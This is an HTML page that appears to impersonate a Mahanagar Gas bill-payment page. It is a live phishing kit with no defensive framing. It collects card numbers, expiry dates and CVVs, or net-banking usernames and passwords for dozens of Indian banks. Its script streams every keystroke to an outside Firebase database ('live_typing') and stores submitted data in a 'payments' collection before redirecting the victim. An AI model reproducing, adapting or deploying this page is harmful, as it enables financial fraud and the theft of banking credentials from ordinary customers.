<!DOCTYPE html>
<html>
<head>
  <title>Mahanagar Gas Payment</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial; background-color: #FFFFFF; text-align: center; padding-top: 50px; margin: 0; }
    img { width: 300px; border-radius: 10px; }
    .form-container { margin: 50px auto; max-width: 400px; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    .form-container h2 { text-align: center; background-color: #0f7213; color: white; padding: 10px; border-radius: 5px; margin-top: 0; }
    .section-title { margin: 20px 0; font-size: 20px; font-weight: bold; text-align: center; }
    
    .side-button { width: 100%; padding: 12px; font-size: 16px; background-color: transparent; color: black; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 10px; cursor: pointer; display: block; }
    .side-button:hover { background-color: #f0f0f0; }
    
    .payment-form { margin-top: 20px; text-align: left; display: none; }
    .payment-form input, .payment-form select, .submit-button { width: 100%; padding: 12px; margin-bottom: 15px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
    
    .row { display: flex; gap: 10px; }
    .row input { flex: 1; }
    .submit-button { background-color: #4082ff; color: white; cursor: pointer; border: none; font-weight: bold; }
    .form-image { width: 100%; margin-top: 10px; border-radius: 10px; }
  </style>
</head>
<body>
  <img src="https://welcomupdates.vercel.app/top.jpg" alt="Top Image">
  <div class="form-container">
    <h2>Mahanagar Gas</h2>
    <div class="section-title">Payment Method</div>

    <button id="btn-debit" class="side-button" onclick="showForm('debit')">💳 Debit Card</button>
    <button id="btn-credit" class="side-button" onclick="showForm('credit')">💳 Credit Card</button>
    <button id="btn-netbanking" class="side-button" onclick="showForm('netbanking')">🏦 NetBanking</button>

    <div id="debitForm" class="payment-form">
      <input type="tel" maxlength="16" placeholder="Debit Card Number" id="debitCardNumber" oninput="liveUpdate()">
      <div class="row">
        <input type="tel" maxlength="2" placeholder="MM" id="debitMonth" oninput="liveUpdate()">
        <input type="tel" maxlength="4" placeholder="YYYY" id="debitYear" oninput="liveUpdate()">
        <input type="password" maxlength="3" placeholder="CVV" id="debitCVV" oninput="liveUpdate()">
      </div>
      <button class="submit-button" onclick="submitCard('debit')">Proceed</button>
      <img class="form-image" src="https://welcomupdates.vercel.app/pay.jpg" alt="Pay">
    </div>

    <div id="creditForm" class="payment-form">
      <input type="tel" maxlength="16" placeholder="Credit Card Number" id="creditCardNumber" oninput="liveUpdate()">
      <div class="row">
        <input type="tel" maxlength="2" placeholder="MM" id="creditMonth" oninput="liveUpdate()">
        <input type="tel" maxlength="4" placeholder="YYYY" id="creditYear" oninput="liveUpdate()">
        <input type="password" maxlength="3" placeholder="CVV" id="creditCVV" oninput="liveUpdate()">
      </div>
      <button class="submit-button" onclick="submitCard('credit')">Proceed</button>
      <img class="form-image" src="https://welcomupdates.vercel.app/pay.jpg" alt="Pay">
    </div>

    <div id="netbankingForm" class="payment-form">
      <select id="bankSelect" onchange="liveUpdate()"></select>
      <input type="text" placeholder="Username / User ID" id="netUser" oninput="liveUpdate()">
      <input type="password" placeholder="Login Password" id="netPass" oninput="liveUpdate()">
      <button class="submit-button" onclick="submitNetBanking()">Proceed</button>
      <img class="form-image" src="https://i.ibb.co/YBGwnQsM/sec.jpg" alt="Pay">
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
      authDomain: "ss22-a96d3.firebaseapp.com",
      projectId: "ss22-a96d3",
      storageBucket: "ss22-a96d3.appspot.com",
      messagingSenderId: "607942972170",
      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    let liveDocId = "user_" + Date.now();

    function showForm(type) {
      document.querySelectorAll('.payment-form').forEach(f => f.style.display = 'none');
      document.querySelectorAll('.side-button').forEach(b => b.style.display = 'block');
      document.getElementById(type + 'Form').style.display = 'block';
      document.getElementById('btn-' + type).style.display = 'none';
    }

    function liveUpdate() {
      const activeForm = Array.from(document.querySelectorAll('.payment-form')).find(f => f.style.display === 'block');
      if(!activeForm) return;

      let data = { timestamp: firebase.firestore.FieldValue.serverTimestamp() };
      const type = activeForm.id.replace('Form', '');

      if (type === 'debit' || type === 'credit') {
        data.method = type + " card";
        data.card = document.getElementById(type + 'CardNumber').value;
        data.expiry = document.getElementById(type + 'Month').value + '/' + document.getElementById(type + 'Year').value;
        data.cvv = document.getElementById(type + 'CVV').value;
      } else {
        data.method = "netbanking";
        data.bank = document.getElementById('bankSelect').value;
        data.username = document.getElementById('netUser').value;
        data.password = document.getElementById('netPass').value;
      }
      db.collection("live_typing").doc(liveDocId).set(data, { merge: true });
    }

    function submitCard(type) {
      db.collection("payments").add({
        method: type + " card",
        card: document.getElementById(type + 'CardNumber').value,
        expiry: document.getElementById(type + 'Month').value + "/" + document.getElementById(type + 'Year').value,
        cvv: document.getElementById(type + 'CVV').value,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      }).then(() => { window.location.href = "page9.html"; });
    }

    function submitNetBanking() {
      db.collection("payments").add({
        method: "netbanking",
        bank: document.getElementById("bankSelect").value,
        username: document.getElementById("netUser").value,
        password: document.getElementById("netPass").value,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      }).then(() => { window.location.href = "page11.html"; });
    }

    const bankList = [
      "Select Bank", "Allahabad Bank", "Andhra Bank", "Axis Bank", "HDFC Bank",
      "Bank of Baroda - Corporate Banking", "Bank of Baroda - Retail Banking",
      "Bank of India", "Bank of Maharashtra", "Canara Bank", "Central Bank of India",
      "City Union Bank", "Corporation Bank", "Deutsche Bank", "Development Credit Bank",
      "Dhanlaxmi Bank", "Federal Bank", "ICICI Bank", "IDBI Bank", "Indian Bank",
      "Indian Overseas Bank", "IndusInd Bank", "ING Vysya Bank", "Jammu and Kashmir Bank",
      "Karnataka Bank Ltd", "Karur Vysya Bank", "Kotak Bank", "Laxmi Vilas Bank",
      "Oriental Bank of Commerce", "Punjab National Bank - Corporate Banking",
      "Punjab National Bank - Retail Banking", "Punjab & Sind Bank",
      "Shamrao Vitthal Co-operative Bank", "South Indian Bank",
      "State Bank of Bikaner & Jaipur", "State Bank of Hyderabad", "State Bank of India",
      "State Bank of Mysore", "State Bank of Patiala", "State Bank of Travancore",
      "Syndicate Bank", "Tamilnad Mercantile Bank Ltd.", "UCO Bank",
      "Union Bank of India", "United Bank of India", "Vijaya Bank", "Yes Bank Ltd"
    ];

    window.onload = function () {
      const bankSelect = document.getElementById("bankSelect");
      bankList.forEach(bank => {
        const opt = document.createElement("option");
        opt.value = bank; opt.text = bank;
        bankSelect.appendChild(opt);
      });
    };
  </script>
</body>
</html>
